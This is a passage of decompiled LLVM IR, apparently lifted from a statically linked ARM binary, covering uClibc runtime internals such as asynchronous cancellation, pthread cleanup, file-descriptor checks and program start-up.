  br i1 %v7_10f985, label %dec_label_pc_10f78.lr.ph, label %dec_label_pc_10f94.preheader.dec_label_pc_10fa0.loopexit_crit_edge

dec_label_pc_10f94.preheader.dec_label_pc_10fa0.loopexit_crit_edge: ; preds = %dec_label_pc_10f94.preheader
  %v1_10fa4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fa0.loopexit

dec_label_pc_10f78.lr.ph:                         ; preds = %dec_label_pc_10f94.preheader
  %v0_10f7c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_10f7c = add i32 %v0_10f7c.pre, 132
  %v2_10f90 = inttoptr i32 %v1_10f7c to i32*
  br label %dec_label_pc_10f78

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f78.lr.ph, %dec_label_pc_10f78
  %v0_10f78 = phi i32 [ %v0_10f941, %dec_label_pc_10f78.lr.ph ], [ %v3_10f90, %dec_label_pc_10f78 ]
  store i32 %v0_10f78, i32* @r2, align 4
  store i32 %v1_10f7c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_10f90 = load i32, i32* %v2_10f90, align 4
  store i32 %v3_10f90, i32* %r7.global-to-local, align 4
  %v1_10f94 = and i32 %v3_10f90, 12
  store i32 %v1_10f94, i32* @r3, align 4
  %v7_10f98 = icmp eq i32 %v1_10f94, 4
  br i1 %v7_10f98, label %dec_label_pc_10f78, label %dec_label_pc_10f94.dec_label_pc_10fa0.loopexit_crit_edge

dec_label_pc_10f94.dec_label_pc_10fa0.loopexit_crit_edge: ; preds = %dec_label_pc_10f78
  %v2_10f98 = icmp ugt i32 %v1_10f94, 3
  store i1 %v2_10f98, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_10fa0.loopexit

dec_label_pc_10fa0.loopexit:                      ; preds = %dec_label_pc_10f94.preheader.dec_label_pc_10fa0.loopexit_crit_edge, %dec_label_pc_10f94.dec_label_pc_10fa0.loopexit_crit_edge
  %v1_10fa4.pre = phi i32 [ %v1_10fa4.pre.pre, %dec_label_pc_10f94.preheader.dec_label_pc_10fa0.loopexit_crit_edge ], [ %v1_10f7c, %dec_label_pc_10f94.dec_label_pc_10fa0.loopexit_crit_edge ]
  %v2_10fa0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10fa0

dec_label_pc_10fa0:                               ; preds = %dec_label_pc_10fa0.loopexit, %entry
  %v1_10fa4 = phi i32 [ %v1_10fa4.pre, %dec_label_pc_10fa0.loopexit ], [ %v0_10f20, %entry ]
  %v2_10fa0 = phi i32 [ %v2_10fa0.pre, %dec_label_pc_10fa0.loopexit ], [ %v3_10f24, %entry ]
  store i32 %v2_10fa0, i32* @r4, align 4
  ret i32 %v1_10fa4

; uselistorder directives
  uselistorder i32 %v3_10f90, { 1, 2, 0 }
  uselistorder i32 %v1_10f7c, { 0, 2, 1 }
  uselistorder i32 %v0_10f68, { 1, 0 }
  uselistorder i32 %v1_10f4c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10f38, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 1, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_10fa0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10f78, { 1, 0 }
  uselistorder label %dec_label_pc_10f6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f54, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10fa8 = load i32, i32* @r4, align 4
  store i32 %v3_10fa8, i32* %stack_var_-24, align 4
  store i32 77900, i32* %r8.global-to-local, align 4
  %v0_10fb0 = call i32 @__aeabi_read_tp()
  %v1_10fb4 = add i32 %v0_10fb0, -1036
  %v2_10fb4 = inttoptr i32 %v1_10fb4 to i32*
  %v3_10fb4 = load i32, i32* %v2_10fb4, align 4
  store i32 %v3_10fb4, i32* %r6.global-to-local, align 4
  %v1_10fb8 = add i32 %v0_10fb0, -1168
  store i32 %v1_10fb8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r8.global-to-local, align 4
  %v1_10fc046 = or i32 %v3_10fb4, 2
  store i32 %v1_10fc046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_10fc449 = icmp eq i32 %v1_10fc046, %v3_10fb4
  br i1 %v9_10fc449, label %dec_label_pc_11070, label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %entry, %bb.dec_label_pc_10fcc_crit_edge
  %v0_10fd0 = phi i32 [ %v0_10fd0.pre, %bb.dec_label_pc_10fcc_crit_edge ], [ %v1_10fb8, %entry ]
  %v1_10fc051 = phi i32 [ %v1_10fc0, %bb.dec_label_pc_10fcc_crit_edge ], [ %v1_10fc046, %entry ]
  %v0_10fd450 = phi i32 [ %v1_11000, %bb.dec_label_pc_10fcc_crit_edge ], [ %v3_10fb4, %entry ]
  store i32 %v1_10fc051, i32* @r1, align 4
  %v1_10fd0 = add i32 %v0_10fd0, 132
  store i32 %v1_10fd0, i32* %r2.global-to-local, align 4
  store i32 %v0_10fd450, i32* %r4.global-to-local, align 4
  %v1_10fd834 = inttoptr i32 %v1_10fd0 to i32*
  %v2_10fd835 = load i32, i32* %v1_10fd834, align 4
  store i32 %v2_10fd835, i32* @r3, align 4
  %v3_10fdc37 = icmp uge i32 %v2_10fd835, %v0_10fd450
  store i1 %v3_10fdc37, i1* %cpsr_c.global-to-local, align 1
  %v9_10fdc43 = icmp eq i32 %v2_10fd835, %v0_10fd450
  br i1 %v9_10fdc43, label %dec_label_pc_10fe4, label %dec_label_pc_10ffc

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10fcc, %dec_label_pc_10fe4.dec_label_pc_10fd8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_10ff4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10ff4, label %dec_label_pc_10ff8, label %dec_label_pc_10fe4.dec_label_pc_10fd8_crit_edge

dec_label_pc_10fe4.dec_label_pc_10fd8_crit_edge:  ; preds = %dec_label_pc_10fe4
  %v0_10fd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10fdc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10fd8 = inttoptr i32 %v0_10fd8.pre to i32*
  %v2_10fd8 = load i32, i32* %v1_10fd8, align 4
  store i32 %v2_10fd8, i32* @r3, align 4
  %v3_10fdc = icmp uge i32 %v2_10fd8, %v1_10fdc.pre
  store i1 %v3_10fdc, i1* %cpsr_c.global-to-local, align 1
  %v9_10fdc = icmp eq i32 %v2_10fd8, %v1_10fdc.pre
  br i1 %v9_10fdc, label %dec_label_pc_10fe4, label %dec_label_pc_10ffc

dec_label_pc_10ff8:                               ; preds = %dec_label_pc_10fe4
  %v0_10ff8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10ff8, i32* @r3, align 4
  br label %dec_label_pc_10ffc

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10fcc, %dec_label_pc_10fe4.dec_label_pc_10fd8_crit_edge, %dec_label_pc_10ff8
  %v1_11000 = phi i32 [ %v0_10ff8, %dec_label_pc_10ff8 ], [ %v2_10fd835, %dec_label_pc_10fcc ], [ %v2_10fd8, %dec_label_pc_10fe4.dec_label_pc_10fd8_crit_edge ]
  %v1_10ffc = load i32, i32* %r6.global-to-local, align 4
  %v3_10ffc = icmp uge i32 %v1_11000, %v1_10ffc
  store i1 %v3_10ffc, i1* %cpsr_c.global-to-local, align 1
  %v9_10ffc = icmp eq i32 %v1_11000, %v1_10ffc
  br i1 %v9_10ffc, label %dec_label_pc_11008, label %bb

bb:                                               ; preds = %dec_label_pc_10ffc
  store i32 %v1_11000, i32* %r6.global-to-local, align 4
  %v1_10fc0 = or i32 %v1_11000, 2
  store i32 %v1_10fc0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_10fc4 = icmp eq i32 %v1_10fc0, %v1_11000
  br i1 %v9_10fc4, label %dec_label_pc_11070, label %bb.dec_label_pc_10fcc_crit_edge

bb.dec_label_pc_10fcc_crit_edge:                  ; preds = %bb
  %v0_10fd0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10fcc

dec_label_pc_11008:                               ; preds = %dec_label_pc_10ffc
  %v0_11008 = load i32, i32* %r5.global-to-local, align 4
  %v1_11008 = and i32 %v0_11008, -69
  store i32 %v1_11008, i32* @r3, align 4
  %v2_1100c = icmp ugt i32 %v1_11008, 9
  store i1 %v2_1100c, i1* %cpsr_c.global-to-local, align 1
  %v7_1100c = icmp eq i32 %v1_11008, 10
  br i1 %v7_1100c, label %dec_label_pc_11014, label %dec_label_pc_11070

dec_label_pc_11014:                               ; preds = %dec_label_pc_11008
  %v1_11018 = load i32, i32* %r7.global-to-local, align 4
  %v2_11018 = add i32 %v1_11018, 544
  %v3_11018 = inttoptr i32 %v2_11018 to i32*
  store i32 -1, i32* %v3_11018, align 4
  %v0_1101c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1101c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11020

dec_label_pc_11020:                               ; preds = %dec_label_pc_11054.dec_label_pc_11020_crit_edge, %dec_label_pc_11014
  %v0_11024 = phi i32 [ %v0_11024.pre, %dec_label_pc_11054.dec_label_pc_11020_crit_edge ], [ %v0_1101c, %dec_label_pc_11014 ]
  %v0_11020 = load i32, i32* %r7.global-to-local, align 4
  %v1_11020 = add i32 %v0_11020, 132
  %v2_11020 = inttoptr i32 %v1_11020 to i32*
  %v3_11020 = load i32, i32* %v2_11020, align 4
  store i32 %v0_11024, i32* %r2.global-to-local, align 4
  store i32 %v3_11020, i32* %r4.global-to-local, align 4
  %v1_1102c = or i32 %v3_11020, 16
  store i32 %v1_1102c, i32* @r1, align 4
  %v1_1103022 = inttoptr i32 %v0_11024 to i32*
  %v2_1103023 = load i32, i32* %v1_1103022, align 4
  %v3_1103425 = icmp uge i32 %v2_1103023, %v3_11020
  store i1 %v3_1103425, i1* %cpsr_c.global-to-local, align 1
  %v9_1103431 = icmp eq i32 %v2_1103023, %v3_11020
  br i1 %v9_1103431, label %dec_label_pc_1103c, label %dec_label_pc_11054

dec_label_pc_1103c:                               ; preds = %dec_label_pc_11020, %dec_label_pc_1103c.dec_label_pc_11030_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1104c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1104c, label %dec_label_pc_11050, label %dec_label_pc_1103c.dec_label_pc_11030_crit_edge

dec_label_pc_1103c.dec_label_pc_11030_crit_edge:  ; preds = %dec_label_pc_1103c
  %v0_11030.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11034.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11030 = inttoptr i32 %v0_11030.pre to i32*
  %v2_11030 = load i32, i32* %v1_11030, align 4
  %v3_11034 = icmp uge i32 %v2_11030, %v1_11034.pre
  store i1 %v3_11034, i1* %cpsr_c.global-to-local, align 1
  %v9_11034 = icmp eq i32 %v2_11030, %v1_11034.pre
  br i1 %v9_11034, label %dec_label_pc_1103c, label %dec_label_pc_11054

dec_label_pc_11050:                               ; preds = %dec_label_pc_1103c
  %v0_11050 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11054

dec_label_pc_11054:                               ; preds = %dec_label_pc_11020, %dec_label_pc_1103c.dec_label_pc_11030_crit_edge, %dec_label_pc_11050
  %v0_11054 = phi i32 [ %v0_11050, %dec_label_pc_11050 ], [ %v2_1103023, %dec_label_pc_11020 ], [ %v2_11030, %dec_label_pc_1103c.dec_label_pc_11030_crit_edge ]
  %v1_11054 = phi i32 [ %v0_11050, %dec_label_pc_11050 ], [ %v3_11020, %dec_label_pc_11020 ], [ %v1_11034.pre, %dec_label_pc_1103c.dec_label_pc_11030_crit_edge ]
  %v3_11054 = icmp uge i32 %v0_11054, %v1_11054
  store i1 %v3_11054, i1* %cpsr_c.global-to-local, align 1
  %v9_11054 = icmp eq i32 %v0_11054, %v1_11054
  br i1 %v9_11054, label %dec_label_pc_1105c, label %dec_label_pc_11054.dec_label_pc_11020_crit_edge

dec_label_pc_11054.dec_label_pc_11020_crit_edge:  ; preds = %dec_label_pc_11054
  %v0_11024.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11020

dec_label_pc_1105c:                               ; preds = %dec_label_pc_11054
  store i32 124, i32* @r3, align 4
  %v0_11064 = load i32, i32* %r8.global-to-local, align 4
  %v2_11064 = add i32 %v0_11064, 124
  %v3_11064 = inttoptr i32 %v2_11064 to i32*
  %v4_11064 = load i32, i32* %v3_11064, align 4
  store i32 %v4_11064, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11064)
  %v0_11070.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11070

dec_label_pc_11070:                               ; preds = %entry, %bb, %dec_label_pc_11008, %dec_label_pc_1105c
  %v0_11070 = phi i32 [ %v1_11000, %dec_label_pc_11008 ], [ %v0_11070.pre, %dec_label_pc_1105c ], [ %v3_10fb4, %entry ], [ %v1_11000, %bb ]
  %v2_11074 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11074, i32* @r4, align 4
  ret i32 %v0_11070

; uselistorder directives
  uselistorder i32 %v0_11050, { 1, 0 }
  uselistorder i32 %v1_11034.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10fc0, { 1, 2, 0 }
  uselistorder i32 %v1_10ffc, { 1, 0 }
  uselistorder i32 %v1_11000, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_10fdc.pre, { 1, 0 }
  uselistorder i32 %v0_10fd450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 1, 6, 10, 7, 9, 8, 2, 0 }
  uselistorder i32 124, { 1, 2, 3, 0 }
  uselistorder i32 132, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11070, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11054, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1103c, { 1, 0 }
  uselistorder label %dec_label_pc_10ffc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10fe4, { 1, 0 }
  uselistorder label %dec_label_pc_10fcc, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_11094 = add i32 %tmp, 4
  %v4_11094 = inttoptr i32 %v3_11094 to i32*
  store i32 %arg3, i32* %v4_11094, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_110a0 = icmp eq i32 %arg2, 0
  br i1 %v2_110a0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_110ac = add i32 %tmp, 4
  %v3_110ac = inttoptr i32 %v2_110ac to i32*
  %v4_110ac = load i32, i32* %v3_110ac, align 4
  store i32 %v4_110ac, i32* %r0.global-to-local, align 4
  %v3_110b0 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_110b0, %bb ], [ undef, %entry ]
  %v2_110b8 = xor i1 %v2_110a0, true
  call void @__pseudo_cond_branch(i1 %v2_110b8, i32 %.02)
  %v1_110c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_110c4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_110ec.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_110c8 = load i32, i32* @r4, align 4
  store i32 %v3_110c8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_110ec

dec_label_pc_110ec:                               ; preds = %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge, %dec_label_pc_110ec.lr.ph
  %v1_110ec = phi i32 [ %v1_110f8, %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge ], [ 0, %dec_label_pc_110ec.lr.ph ]
  %v0_110ec = phi i32 [ %v0_110ec.pre, %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -8), %dec_label_pc_110ec.lr.ph ]
  %v4_110ec = mul i32 %v1_110ec, 4
  %v5_110ec = add i32 %v4_110ec, %v0_110ec
  %v6_110ec = inttoptr i32 %v5_110ec to i32*
  %v7_110ec = load i32, i32* %v6_110ec, align 4
  call void @__pseudo_branch(i32 %v7_110ec)
  %v0_110f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_110f8 = add i32 %v0_110f8, -1
  store i32 %v1_110f8, i32* %r4.global-to-local, align 4
  %v2_110f8 = icmp eq i32 %v0_110f8, 0
  br i1 %v2_110f8, label %dec_label_pc_11100, label %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge

dec_label_pc_110ec.dec_label_pc_110ec_crit_edge:  ; preds = %dec_label_pc_110ec
  %v0_110ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_110ec

dec_label_pc_11100:                               ; preds = %dec_label_pc_110ec
  %v0_11104.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_11104 = add i32 %v0_11104.pre, 12952
  %v3_11104 = inttoptr i32 %v2_11104 to i32*
  %v4_11104 = load i32, i32* %v3_11104, align 4
  %v2_11108 = icmp eq i32 %v4_11104, 0
  br i1 %v2_11108, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_11100
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_11100, %bb
  %v2_11110 = xor i1 %v2_11108, true
  call void @__pseudo_cond_branch(i1 %v2_11110, i32 %v4_11104)
  %v0_11118 = load i32, i32* %r5.global-to-local, align 4
  %v2_11118 = add i32 %v0_11118, 12956
  %v3_11118 = inttoptr i32 %v2_11118 to i32*
  %v4_11118 = load i32, i32* %v3_11118, align 4
  %v2_1111c = icmp eq i32 %v4_11118, 0
  br i1 %v2_1111c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_11124 = xor i1 %v2_1111c, true
  call void @__pseudo_cond_branch(i1 %v2_11124, i32 %v4_11118)
  %v2_11128 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11128, i32* %r4.global-to-local, align 4
  %v1_1112c = load i32, i32* @r0, align 4
  ret i32 %v1_1112c

; uselistorder directives
  uselistorder i32 %v1_110f8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_11144 = load i32, i32* @r4, align 4
  %v6_11144 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_11158 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_11160 = icmp eq i32 %v2_11158, -1
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r3, align 4
  br i1 %v3_11160, label %dec_label_pc_1116c, label %dec_label_pc_11184

dec_label_pc_1116c:                               ; preds = %entry
  %v0_11170 = load i32, i32* @r5, align 4
  %v2_11178 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35720), i32 %v0_11170)
  %v1_1117c = load i32, i32* @r4, align 4
  %v1_11180 = icmp ne i32 %v2_11178, %v1_1117c
  call void @__pseudo_cond_branch(i1 %v1_11180, i32 ptrtoint (i32* @global_var_f324.697 to i32))
  br label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %entry, %dec_label_pc_1116c
  %v1_1118c = phi i32 [ %v2_11158, %entry ], [ %v2_11178, %dec_label_pc_1116c ]
  store i32 %v3_11144, i32* @r4, align 4
  store i32 %v6_11144, i32* @r5, align 4
  ret i32 %v1_1118c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_11184, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11198 = load i32, i32* @r4, align 4
  store i32 %v3_11198, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r4.global-to-local, align 4
  %v4_111a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 156) to i32*), align 4
  %v1_111ac = inttoptr i32 %v4_111a8 to i32*
  %v2_111ac = load i32, i32* %v1_111ac, align 4
  %v2_111b0 = icmp eq i32 %v2_111ac, 0
  br i1 %v2_111b0, label %dec_label_pc_111b8, label %dec_label_pc_111dc

dec_label_pc_111b8:                               ; preds = %entry
  store i32 4096, i32* %v1_111ac, align 4
  %v0_111c0 = call i32 @__pthread_initialize_minimal()
  %v0_111c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_111c8 = add i32 %v0_111c8, -100340
  %v2_111d0 = icmp eq i32 %v2_111c8, 0
  br i1 %v2_111d0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_111b8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_111b8, %bb
  %v2_111d8 = xor i1 %v2_111d0, true
  call void @__pseudo_cond_branch(i1 %v2_111d8, i32 %v2_111c8)
  %v2_111dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_111dc

dec_label_pc_111dc:                               ; preds = %entry, %bb4
  %v2_111dc = phi i32 [ %v2_111dc.pre, %bb4 ], [ %v3_11198, %entry ]
  %.0 = phi i32 [ %v0_111c0, %bb4 ], [ undef, %entry ]
  store i32 %v2_111dc, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_111dc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 77312, i32* %r4.global-to-local, align 4
  %v1_111fc = add i32 %tmp, 4
  store i32 %v1_111fc, i32* %ip.global-to-local, align 4
  %v2_11200 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r4.global-to-local, align 4
  %v3_1120c = mul i32 %arg2, 4
  store i32 %v3_1120c, i32* @r7, align 4
  %v4_11214 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 24) to i32*), align 4
  store i32 %v4_11214, i32* %r1.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v2_1121c = add i32 %v1_111fc, %v3_1120c
  store i32 %v2_1121c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %stack_var_-416, align 4
  %v4_11224 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 60) to i32*), align 4
  store i32 %v4_11224, i32* %r4.global-to-local, align 4
  %v3_11228 = icmp uge i32 %v2_1121c, %v2_11200
  store i1 %v3_11228, i1* %cpsr_c.global-to-local, align 1
  %v9_11228 = icmp eq i32 %v2_1121c, %v2_11200
  store i1 %v9_11228, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_11230 = inttoptr i32 %v4_11224 to i32*
  store i32 %v2_1121c, i32* %v2_11230, align 4
  br i1 %v9_11228, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_11238 = load i32, i32* %r2.global-to-local, align 4
  %v1_11238 = load i32, i32* %r1.global-to-local, align 4
  %v2_11238 = inttoptr i32 %v1_11238 to i32*
  store i32 %v0_11238, i32* %v2_11238, align 4
  %v2_1123c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1123c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 12956, i32* %r2.global-to-local, align 4
  %v0_11248 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11248, i32* @r6, align 4
  br i1 %v9_11228, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_1125053 = add i32 %v2_1123c, 12956
  %v4_1125054 = inttoptr i32 %v3_1125053 to i32*
  store i32 %arg6, i32* %v4_1125054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_1124c = load i32, i32* %ip.global-to-local, align 4
  %v2_1124c = load i32, i32* @r7, align 4
  %v3_1124c = add i32 %v2_1124c, %v1_1124c
  store i32 %v3_1124c, i32* %r3.global-to-local, align 4
  %v3_1125050 = add i32 %v2_1123c, 12956
  %v4_1125051 = inttoptr i32 %v3_1125050 to i32*
  store i32 %arg6, i32* %v4_1125051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1125c = load i32, i32* %r3.global-to-local, align 4
  %v2_1125c = load i32, i32* %r4.global-to-local, align 4
  %v3_1125c = inttoptr i32 %v2_1125c to i32*
  store i32 %v1_1125c, i32* %v3_1125c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_11260 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_11260, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_11268 = bitcast i32* %stack_var_-120 to i8*
  %v4_11268 = call i32 @__GI_memset(i8* %v3_11268, i32 0, i32 120)
  store i32 %v4_11268, i32* %r0.global-to-local, align 4
  %v0_1126c = load i32, i32* %r4.global-to-local, align 4
  %v1_1126c = inttoptr i32 %v0_1126c to i32*
  %v2_1126c = load i32, i32* %v1_1126c, align 4
  br label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_11278, %bb77
  %storemerge = phi i32 [ %v2_1126c, %bb77 ], [ %v1_11284, %dec_label_pc_11278 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_11278 = inttoptr i32 %storemerge to i32*
  %v2_11278 = load i32, i32* %v1_11278, align 4
  store i32 %v2_11278, i32* %r3.global-to-local, align 4
  %v2_1127c = icmp eq i32 %v2_11278, 0
  %v1_11284 = add i32 %storemerge, 4
  br i1 %v2_1127c, label %dec_label_pc_11284, label %dec_label_pc_11278

